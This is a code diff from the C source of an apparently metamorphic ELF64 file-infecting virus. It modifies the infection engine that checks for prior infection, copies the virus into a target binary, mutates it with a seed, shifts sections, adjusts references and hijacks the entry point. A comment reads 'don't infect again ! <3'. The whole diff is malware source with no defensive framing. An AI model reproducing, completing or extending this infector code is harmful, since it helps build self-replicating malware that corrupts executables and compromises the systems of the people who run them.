@@ -8,11 +8,10 @@
 ** if current binary is already our client, don't infect again ! <3
 */
 
-static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_ref)
+static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_ref, size_t dist_entry_header)
 {
 	const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
 	const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
-	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
 	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
 	char	 	*signature       = safe(file_ref, signature_offset, SIGNATURE_LEN);
 
@@ -88,20 +87,20 @@ bool		infection_engine(struct virus_header *vhdr, \
 	struct entry	clone_entry;
 	const size_t	*loader_off = &file_entry.end_of_last_section;
 	size_t		shift_amount = 0;                                       // changed by <define_shift_amount>
-	uint64_t	seed = vhdr->seed;                                      // changed by <generate_seed>
+	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
 	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_self>
 
 	if (!find_entry(&file_entry, file_ref)
-	|| !not_infected(&file_entry, file_ref)
+	|| !not_infected(&file_entry, file_ref, vhdr->dist_header_loader)
 	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
-	|| !generate_seed(&seed, file_ref)
-	|| !metamorph_clone(clone_ref, full_virus_size, *loader_off, seed)
+	|| !generate_seed(seed, file_ref)
+	|| !metamorph_clone(clone_ref, *loader_off, *seed, full_virus_size, vhdr)
 	|| !define_shift_amount(&file_entry, &shift_amount, *full_virus_size)
 	|| !copy_client_to_clone(clone_ref, file_ref, *loader_off, shift_amount)
 	|| !adjust_references(clone_ref, shift_amount, *loader_off)
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, shift_amount, *full_virus_size)
-	|| !setup_virus_header(clone_ref, *loader_off, *full_virus_size, seed)
+	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
 	|| !change_entry(clone_ref, &file_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
